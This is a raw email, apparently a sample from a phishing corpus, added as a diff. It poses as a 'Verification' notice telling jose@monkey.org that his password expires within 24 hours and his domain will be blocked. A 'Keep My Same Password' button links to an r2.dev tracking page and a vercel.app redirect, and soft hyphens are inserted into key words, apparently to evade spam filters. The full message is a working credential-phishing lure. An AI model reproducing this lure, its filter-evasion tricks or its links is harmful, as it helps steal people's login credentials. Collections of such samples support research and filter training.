@@ -1,0 +1,139 @@
+From jose@monkey.org Thu Sep 28 04:39:47 2023 +0000
+Return-Path: secure@centersecure.cam
+Delivered-To: jose@monkey.org
+X-FDA: 81284753214.11.1BEDBB0
+Received: from mail.centersecure.cam (mail.centersecure.cam [198.23.242.205])
+	by imf25.b.hostedemail.com (Postfix) with ESMTP id E55BB120004
+	for <jose@monkey.org>; Thu, 28 Sep 2023 04:39:45 +0000 (UTC)
+Authentication-Results: imf25.b.hostedemail.com;
+	dkim=pass header.d=centersecure.cam header.s=3EA96D72-5804-11EE-B4FE-0B8E0A59BDD9 header.b=HjSIqGIB;
+	spf=pass (imf25.b.hostedemail.com: domain of secure@centersecure.cam designates 198.23.242.205 as permitted sender) smtp.mailfrom=secure@centersecure.cam;
+	dmarc=pass (policy=none) header.from=centersecure.cam
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1695875986;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=+jkXYdwRMWWoggv1H4n+/H2fuzEL1Y9b9ckRyQAfDp4=;
+	b=HnP+rKP4DoMDKAk4WWObjs2+29Nao86sURDXyEM47czNHZwaMe/GuqzCBf3vyrOu6U3O9j
+	k6iAYOkBhipSFyeGCPEvLPieNE5EHIIOvsog81f3DmlYhS7M6diy217Vm4OQisnhQ+MAWf
+	8W1I2IrFLHRldCzzDYTTdOv+3Av/w1Y=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1695875986; a=rsa-sha256;
+	cv=none;
+	b=fwDN3HO2gkdckOAGCRtkCY5xkPETOuiYxBZGjMLy2R7u9GVCtQ18EIidsVPAfdL+Uut1N9
+	Tll5MpSYbVN+XU0/79Ly3Hfue0dDgCQPs8l5DLl1WAapEIhPoDhHb8IwJKNnvG2crmhiFs
+	b3J9Ema3m9XldG1p3LTDc3HfZXMdBbA=
+ARC-Authentication-Results: i=1;
+	imf25.b.hostedemail.com;
+	dkim=pass header.d=centersecure.cam header.s=3EA96D72-5804-11EE-B4FE-0B8E0A59BDD9 header.b=HjSIqGIB;
+	spf=pass (imf25.b.hostedemail.com: domain of secure@centersecure.cam designates 198.23.242.205 as permitted sender) smtp.mailfrom=secure@centersecure.cam;
+	dmarc=pass (policy=none) header.from=centersecure.cam
+Received: from localhost (localhost [127.0.0.1])
+	by mail.centersecure.cam (Postfix) with ESMTP id EF001C4365
+	for <jose@monkey.org>; Thu, 28 Sep 2023 00:39:43 -0400 (EDT)
+Received: from mail.centersecure.cam ([127.0.0.1])
+ by localhost (mail.centersecure.cam [127.0.0.1]) (amavis, port 10032)
+ with ESMTP id NATNc7ZcttDi for <jose@monkey.org>;
+ Thu, 28 Sep 2023 00:39:39 -0400 (EDT)
+Received: from localhost (localhost [127.0.0.1])
+	by mail.centersecure.cam (Postfix) with ESMTP id 92F0AC4133
+	for <jose@monkey.org>; Wed, 27 Sep 2023 23:27:31 -0400 (EDT)
+DKIM-Filter: OpenDKIM Filter v2.10.3 mail.centersecure.cam 92F0AC4133
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=centersecure.cam;
+	s=3EA96D72-5804-11EE-B4FE-0B8E0A59BDD9; t=1695871652;
+	bh=+jkXYdwRMWWoggv1H4n+/H2fuzEL1Y9b9ckRyQAfDp4=;
+	h=From:To:MIME-Version:Date:Message-Id;
+	b=HjSIqGIBW952YksRHYt+pq+Qa+hHI8CcdjQJ17GTvL2FiAeOYsXBZCXUCu/11Xk9V
+	 R667fxDQ+N4WS3x8KuWlsrFZophtrK35EGJqIzk1tPEz9piW+qttuh/GlZUGEGuMio
+	 g3mM01uZmSa9CyiSTchNw1CF9GdgcGBAuoh3A4eHaBZ+YqQQKQrMLFH1m7Rvcide30
+	 j/+igzMTWV99aZ7BBmclI7eIr4Ut2gHv8GLz1muevyAWZyFp1jgq87YtZ4WrVkT+Bu
+	 3tFIJRGvOEHVjL83Ao0LlV+h4KtoOjv07AxzFwgM4OGu94xYNd2mPu8nrmUbh/wack
+	 7E9mdmNrZNF2g==
+X-Virus-Scanned: amavis at mail.centersecure.cam
+Received: from mail.centersecure.cam ([127.0.0.1])
+ by localhost (mail.centersecure.cam [127.0.0.1]) (amavis, port 10026)
+ with ESMTP id ASVbKZXFpniH for <jose@monkey.org>;
+ Wed, 27 Sep 2023 23:27:29 -0400 (EDT)
+Received: from IP-134-38 (unknown [84.38.134.38])
+	by mail.centersecure.cam (Postfix) with ESMTPSA id 76BC6C5C89
+	for <jose@monkey.org>; Wed, 27 Sep 2023 22:17:31 -0400 (EDT)
+From: "secure@centersecure.cam" <secure@centersecure.cam>
+Subject: Verification
+To: <jose@monkey.org>
+Content-Type: multipart/alternative; boundary="Vp3hypvPlDHxZek=_GxaS2VFu5AxV9R8hJ"
+MIME-Version: 1.0
+Date: Thu, 28 Sep 2023 05:17:30 +0300
+Message-Id: <282920230917053DF0CE0F2D-0827F8629C@centersecure.cam>
+X-Rspamd-Server: rspam10
+X-Rspamd-Queue-Id: E55BB120004
+X-Stat-Signature: hxufyadgrfqxzk3bxas6swzrzusrjeb4
+X-Spam-Status: No, score=2.31
+X-Rspam-User: 
+X-HE-Tag: 1695875985-318193
+X-HE-Meta: U2FsdGVkX1/UaFNxOUFdVB4I4TQCPx0BX9oPIbSLhbLgaua+J+0EtLS7COnKsvh6bdbDa3vXPbqqeGPN481MWbPnU78PkLZfIEO/FtW05nesy83e/K7Q5nyjilXwm3LVT7P6LO5n3NUD0kO42RUZu3aAAynMyTsj82+CEclz48SFPkYtX+8WaRqEjpm7r0lH0GFpI1HLPTLkqa6B87JvV3PU9GeyuNPcELzRf/SISIY=
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 292
+
+This is a multi-part message in MIME format
+
+--Vp3hypvPlDHxZek=_GxaS2VFu5AxV9R8hJ
+Content-Type: text/plain; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+Your Pas=ADsw=ADor=ADd f=ADor (jose@monkey.org) ex=ADpir=ADe=ADs in th=
+e next 24 hour time.=20
+Activation expires after 12hours from 9/28/2023 and your domain monkey=
+=2Eorg will be blocked
+  K=ADeep M=ADy Sam=ADe Pa=ADss=ADw=ADor=ADd
+
+
+
+  =A9 2023 monkey.org All rights reserved.
+
+--Vp3hypvPlDHxZek=_GxaS2VFu5AxV9R8hJ
+Content-Type: text/html; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+<html><head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-=
+8859-1">
+  <body<P style=3D'FONT-SIZE: 14px; FONT-FAMILY: Helvetica, "Microsoft=
+ Yahei", verdana; COLOR: rgb(0,0,0)' align=3D"left"><title>Verificatio=
+n</title>
+ </head>
+ <BODY>Your Pas&shy;sw&shy;or&shy;d f&shy;or&nbsp;<B>(<A style=3D"COLO=
+R: rgb(51,112,255)" href=3D"mailto:jose@monkey.org" target=3D_blank>jo=
+se@monkey.org</A>)</B>&nbsp;ex&shy;pir&shy;e&shy;s in the next 24 hour=
+ time. <P><B><FONT style=3D"VERTICAL-ALIGN: inherit">Activation expire=
+s after 12hours from&nbsp;<FONT color=3D#666666 size=3D4><SPAN style=3D=
+"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: medium; FONT-FAMILY: new; BORDER-R=
+IGHT-WIDTH: 0px; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(0,0,0); PADDING-=
+BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING=
+-RIGHT: 0px; BORDER-TOP-WIDTH: 0px"><FONT color=3D#333333 face=3DVerda=
+na><SPAN style=3D"COLOR: rgb(255,0,0)">9/28/2023</SPAN></FONT></SPAN><=
+/FONT>&nbsp;and your domain </FONT>monkey.org<FONT style=3D"VERTICAL-A=
+LIGN: inherit"> will be blocked</FONT></B></P> <DIV style=3D'FONT-SIZE=
+: 14px; FONT-FAMILY: Helvetica, "Microsoft Yahei", verdana; COLOR: rgb=
+(0,0,0)' align=3Dleft>&nbsp; <DIV id=3Dm_5162031080135385054m_-4008187=
+537326289800m_-8090897632226954793m_5231386328085151014m_-217674973537=
+6133449m_-8665328274966372929m_-4986771040478234230m_68784347973196817=
+81m_-3544880229133279148m_-5202452744170064612m_-4551958271477127930gm=
+ail-##NUMBER2## style=3D"COLOR: rgb(255,255,255); PADDING-BOTTOM: 7px;=
+ PADDING-TOP: 7px; PADDING-LEFT: 7px; DISPLAY: inline-block; PADDING-R=
+IGHT: 7px; BACKGROUND-COLOR: rgb(51,126,202)"><A style=3D"COLOR: rgb(5=
+1,112,255)" href=3D"https://pub-df4beace95374dc1b51f849f36b0858b.r2.de=
+v/track.html#jose@monkey.org" target=3D_blank data-saferedirecturl=3D"=
+https://www.google.com/url?q=3Dhttp://generalpgs.vercel.app/?setprotoc=
+ol%3D%5Bemail%5D&amp;source=3Dgmail&amp;ust=3D1689234423155000&amp;usg=
+=3DAOvVaw2MDMqiQAuqVTrrJC1794QT"><FONT color=3D#ffffff>K&shy;eep M&shy=
+;y Sam&shy;e Pa&shy;ss&shy;w&shy;or&shy;d</FONT></A></DIV></DIV> <P>&n=
+bsp;</p><p>&nbsp;</p><p>&nbsp;</p><p><FONT style=3D"VERTICAL-ALIGN: in=
+herit"><B>&nbsp; &copy; 2023 monkey.org All rights reserved.</B></FONT=
+></P></body>
+ </html>
+
+--Vp3hypvPlDHxZek=_GxaS2VFu5AxV9R8hJ--
